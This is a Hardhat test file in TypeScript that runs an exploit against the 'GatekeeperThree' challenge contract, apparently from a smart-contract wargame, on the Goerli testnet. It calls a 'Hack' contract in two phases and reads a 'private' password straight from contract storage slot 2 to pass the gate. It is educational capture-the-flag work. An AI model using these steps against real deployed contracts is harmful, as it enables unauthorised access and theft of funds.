import { assert } from "chai"
import { network, ethers } from "hardhat"
import { developmentChains,networkConfig } from "../../helper-hardhat-config"
import { GatekeeperThree , Hack } from "../../typechain-types"
import abi from "../../artifacts/contracts/GatekeeperThree.sol/GatekeeperThree.json"

const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL
const PRIVATE_KEY = String(process.env.PRIVATE_KEY) 

developmentChains.includes(network.name)
    ? describe.skip
    : describe("Gatekeeper three hack staging", function () {
        let provider: any 
        let wallet:any
        let hack: Hack
        let addressContract: string
        let gate: GatekeeperThree

        beforeEach(async() => {
            provider =  new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
            wallet  = new ethers.Wallet(PRIVATE_KEY,provider)
            
            hack = await ethers.getContract("Hack")
            addressContract = networkConfig[network.config.chainId!]["contractAddress"]!
            gate = new ethers.Contract(addressContract,abi.abi,wallet)
        })
        describe("Try hack the gate", function () {
            it("Phase One ", async() => {
                const tx = await hack.phaseOne({value: "1000000000000001"})
                await tx.wait()
            })
            it("Get the password and phase two", async() => {
                let address:string = (await gate.trick()).toString()
                let password:string = (await provider.getStorageAt(address, 2)).toString()
                const tx = await hack.phaseTwo(password)
                await tx.wait()
                let entrant:string = (await gate.entrant()).toString()
                assert.equal(entrant,wallet.address);
            })
           
        })
        
    }) 